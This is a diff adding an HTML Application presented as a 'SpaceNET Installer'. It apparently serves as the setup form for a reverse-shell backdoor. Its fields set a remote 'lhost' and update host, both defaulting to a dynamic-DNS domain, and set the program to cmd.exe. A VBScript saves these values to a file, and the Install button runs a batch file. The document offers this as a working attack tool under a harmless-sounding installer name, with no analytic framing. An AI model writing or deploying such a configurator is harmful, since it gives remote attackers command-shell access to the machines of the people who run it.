@@ -1,0 +1,138 @@
+<hta:application
+icon="#"
+border="thin"
+borderStyle="static"
+caption="yes"
+innerBorder="no"
+maximizeButton="no"
+minimizeButton="yes"
+navigable="no"
+scroll="no"
+scrollFlat="yes"
+singleInstance="yes"
+showInTaskbar="yes"
+windowState="normal"
+contextMenu="no"
+version="1.0"
+>
+
+<!DOCTYPE html>
+<HTML><HEAD><TITLE>SpaceNET Installer v1.1</TITLE>
+
+<style type='text/css'>
+</style>
+
+</head> 
+
+<script LANGUAGE="VBScript">
+    Sub SaveData
+        Set objFSO = CreateObject("Scripting.FileSystemObject")
+        If objFSO.FileExists("C:\data.txt") Then
+           Set objFile = objFSO.OpenTextFile("tmp.txt", 8)
+		   
+            strLine = lhost.Value & vbTab
+            objFile.WriteLine strLine
+			
+            strLine = lport.Value & vbTab
+            objFile.WriteLine strLine
+			
+            strLine = program.Value & vbTab
+            objFile.WriteLine strLine
+			
+            strLine = uphost.Value & vbTab
+            objFile.WriteLine strLine
+			
+            strLine = uport.Value & vbTab
+            objFile.WriteLine strLine
+
+            objFile.Close
+        Else
+            Set objFile = objFSO.CreateTextFile("tmp.txt")
+		   
+            strLine = lhost.Value & vbTab
+            objFile.WriteLine strLine
+			
+            strLine = lport.Value & vbTab
+            objFile.WriteLine strLine
+			
+            strLine = program.Value & vbTab
+            objFile.WriteLine strLine
+			
+            strLine = uphost.Value & vbTab
+            objFile.WriteLine strLine
+			
+            strLine = uport.Value & vbTab
+            objFile.WriteLine strLine
+
+            objFile.Close
+        End If
+    End Sub
+</script>
+<body>
+<script type="text/javascript">
+    window.resizeTo(420,250);
+</script>
+
+<table border="0" align="center">
+	<tr>
+		<td>
+			<p>lhost:</p>
+		</td>
+		<td>
+			<input type="text" name="lhost" id="OB1" value="hongkong0beasts2.ddns.net" style="width: 250px;">
+		</td>
+	</tr>
+	
+	<tr>
+		<td>
+			<p>lport</p>
+		</td>
+		<td>
+			<input type="text" name="lport" id="OB2" style="width: 250px;">
+		</td>
+	</tr>
+	
+	<tr>
+		<td>
+			<p>program</p>
+		</td>
+		<td>
+			<input type="text" name="program" id="OB3" value="cmd.exe" style="width: 250px;">
+		</td>
+	</tr>
+	
+	<tr>
+		<td>
+			<p>update host</p>
+		</td>
+		<td>
+			<input type="text" name="uphost" id="OB4" value="hongkong0beasts2.ddns.net" style="width: 250px;">
+		</td>
+	</tr>
+	
+	<tr>
+		<td>
+			<p>update port</p>
+		</td>
+		<td>
+			<input type="text" name="uport" id="OB5" style="width: 250px;">
+		</td>
+	</tr>
+</table>
+<br>
+<table border="0" align="center">
+	<td>
+		<input type="button" name="Writer" value="Write" OnClick="SaveData">
+	</td>
+	<td>
+		<INPUT TYPE="button" NAME="Button" VALUE="Install">
+	</td>
+</table>
+
+
+      <SCRIPT FOR="Button" EVENT="onClick" LANGUAGE="VBScript">
+        Set WshShell = CreateObject("WScript.Shell")
+        WshShell.Run "spc-ins.bat"
+      </SCRIPT>
+</body> 
+</html> 
